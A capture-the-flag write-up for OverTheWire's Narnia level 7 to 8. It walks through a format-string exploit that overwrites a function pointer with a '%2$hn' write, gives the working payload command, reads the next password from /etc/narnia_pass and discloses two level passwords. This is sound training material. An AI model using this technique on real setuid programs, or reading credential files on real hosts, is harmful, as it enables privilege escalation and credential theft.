# Narnia Level 07 to 08

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 7 -> 8 |
| Status | Complete |

## Objective

Use the format-string bug in `narnia7` to overwrite the local function pointer `ptrf` so execution jumps from `goodfunction()` to `hackedfunction()`.

## Given Access

User: `narnia7`

Password:

```text
54RtepCEU0
```

## Recon

A normal run leaks everything needed:

```text
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f
before : ptrf() = 0x80492ea (0xffffd318)
```

So the only change required is the low 16-bit rewrite:

- current: `0x92ea`
- target: `0x930f`

## Stack Positioning

A gdb-assisted probe on the live host showed:

- the first `%x` consumed the current `ptrf` value
- the second stack argument corresponded to the 4 raw bytes injected at the start of the format string

That made `%2$hn` the correct write primitive.

## Exploit Strategy

1. Put the live `ptrf` address at the start of the payload.
2. Use a wide padded positional format to print exactly `0x930f` bytes total.
3. Write that count into `ptrf` with `%2$hn`.

Because the raw address bytes contribute 4 characters before the format sequence, the working payload was:

```text
<ptrf-address> + %1$37643x%2$hn
```

## Working Exploit

```bash
PAY=$(python3 -c 'import sys,struct;sys.stdout.buffer.write(struct.pack("<I",0xffffd318)+b"%1$37643x%2$hn")')
/narnia/narnia7 "$PAY"
```

This redirected control flow into `hackedfunction()` and produced a privileged shell.

The next password was then recovered with:

```bash
cat /etc/narnia_pass/narnia8
```

## Password

```text
i1SQ81fkb8
```

## Notes

- An earlier `%37643c%1$hn` attempt crashed because it wrote through the wrong argument slot.
- The working payload depended on the live `ptrf` address printed by the binary, which stayed stable for the matching argv length used in the exploit.

## References

- https://overthewire.org/wargames/narnia/
